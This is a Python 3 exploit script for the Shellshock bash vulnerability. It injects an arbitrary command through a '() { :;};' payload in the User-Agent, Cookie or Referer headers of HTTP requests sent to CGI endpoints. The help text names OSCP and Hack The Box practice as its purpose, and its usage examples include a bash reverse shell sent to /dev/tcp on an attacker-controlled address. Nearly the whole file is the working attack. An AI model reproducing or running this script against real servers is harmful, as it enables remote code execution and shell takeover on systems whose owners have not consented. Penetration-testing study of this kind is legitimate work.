#!/usr/bin/python3
import requests
import argparse
import sys

def request(target, port, uri, command, header, proto, verbose):
    url = (proto + '://' + target + ':' + str(port) + uri)
    for value in header:
        h = {value:'() { :;}; echo; ' + command}
        try:
            if verbose:
                    print ('Sending request with details:\n    ' +
                       'URI = ' + str(url) + '\n    ' +
                       'Header for this request= ' + str(h) + '\n    ' +
                       'verify=False')
            r = requests.get(url, headers=h, verify=False)
            print ('Request sent. \nDone.')
            if verbose:
                print ('Status code returned = ' + str(r.status_code))
                print (r.text)
                #need to build in a regex here to check for responses / output in response
        except:
            if verbose:
                e = sys.exc_info()[0]
                print ('Error: %s' % e )
                print ('Script failed. Check inputs and try again. Suggest sending requests through Burp for additional info on response')
            else:
                print ('Script Failed. Check inputs and try again or set -v / --verbose for more info.')


def main():
    #argument attempts?
    parser = argparse.ArgumentParser(
        description='Shellshock script to test vulnerable servers during OSCP and HTB. Works best when sending request through Burp. Set up a proxy listener and forward the script requests to the host. Intercept request and modify as necessary. Created this because I could not figure out how to make the nmap HTTP-shellshock.nse script do what I wanted',
        add_help=False,
        usage='ss.py -h | ss.py --help',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog='''
Examples:
    \tpython3 shellshock.py target -p port -u 'uri'
    \tpython3 shellshock.py 127.0.0.1 -p 8081 -u '/cgi-bin/something' -c 'bash -c "id"' --verbose -H 'Referer'
    \tpython3 shellshock.py 1.1.1.1 -p 10000 -u '/' --command 'bash -i >& /dev/tcp/10.10.10.1/1234 0>&1' --header 'User-Agent' --proto https
        '''
        )
    parser.add_argument('target', type=str, help='target to run against.')
    parser.add_argument('-p', '--port', dest='port', type=str, default='80', help='Default port = 80')
    parser.add_argument('-u', '--uri', dest='uri', type=str, default='/', help='URI to run against (typically /cgi-bin/something).')
    parser.add_argument('-c', '--command', dest='command', type=str, default='/bin/id', help='command to run. Default payload = /bin/id')
    parser.add_argument('-H', '--header', dest='header', type=str, help='Choose a specific header to test shellshock. Defaults to test User-Agent, Cookie, and Referrer')
    parser.add_argument('-P', '--proto', dest='proto', type=str, default='http', help='force protocol http or https', metavar='http|https')
    parser.add_argument('-h', '--help', action='help', help='\t\tPrint this help message then exit')
    parser.add_argument('-v', '--verbose', action='store_true', default=False, help='Verbose output')

    arg = parser.parse_args()

    verbose = arg.verbose

    target = '' #target ip
    target = arg.target

    port = '' #target port
    port = arg.port
    port = int(port)
    if port <= 0 or port > 65535:
        print >> sys.stderr, 'Port \'' + str(port) + '\' is not a valid port number.'
        sys.stderr.flush()
        sys.exit(1)

    uri = ''
    uri = arg.uri

    command = '' #command to run
    command = arg.command

    #locations to test shellshock
    if arg.header:
        header = [arg.header]
    else:
        header = ['User-Agent', 'Cookie', 'Referer']

    proto = '' #http or https
    proto = arg.proto




    if verbose:
        print ('\nTarget set to = ' + target + '\n Port set to = ' + str(port) + '\n URI set to = ' + uri + '\n Command set to = ' + command + '\n Header set to = ' + str(header) + '\n Protocol set to = ' + proto + '\n')

    request(target, port, uri, command, header, proto, verbose)

if __name__ == '__main__':
    main()
